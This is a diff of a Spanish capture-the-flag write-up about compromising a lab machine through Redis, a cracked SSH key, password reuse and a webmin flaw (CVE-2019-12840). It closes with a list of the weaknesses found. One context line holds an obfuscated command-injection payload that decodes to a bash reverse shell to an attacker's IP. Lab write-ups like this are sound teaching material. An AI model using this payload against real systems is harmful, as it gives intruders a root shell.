@@ -105,4 +105,18 @@ Cookie: redirect=1; testing=1; sid=5f376f95923e8a275a21fe3ef86fc671
 
 u=acl%2Fapt&u=$(echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhOQzR4TUM0eU15ODBORFEwSURBK0pqRUsK|base64${IFS}-d|base64${IFS}-d|bash)
 ```
-La ponemos en nuestro repeater , abrimos el listener en local y lanzamos la request
+La ponemos en nuestro repeater , abrimos el listener en local y lanzamos la request obteniendo asi una reverse shell como root
+
+# Analisís de la intrusion
+### Unrestricted redis acces
+Podemos acceder al servicio redis sin ningun tipo de autentificación subiendo nuestra clave ssh a sus claves aturoizadas 
+### Sensible data exposure
+La clave SSH de Matt es accesible para el usuario de Redis
+### Bad password policie
+La clave de Matt tanto para la clave SSH como para el usuario esta dentro de rockyou.txt, esto nos permitio crackear la cclave obtenida y obtener acceso al sistema como Matt
+### Password Reutilization
+La clave del usuario Matt es la misma que se usó en el servicio webmin,esto nos permitio comprometer el servicio
+### Webmin as root
+Webmin fue lanzado como root, esto hace que si se consigue un RCE la máquina quede totalmente comprometida
+### CVE 2019-12840
+La versión de Webmin utilizada es vulnerable a dicho CVE que permite obtener RCE con unas credenciales validas en el servicio webmin, lo que nos permitio comprometer de manera total el sistema
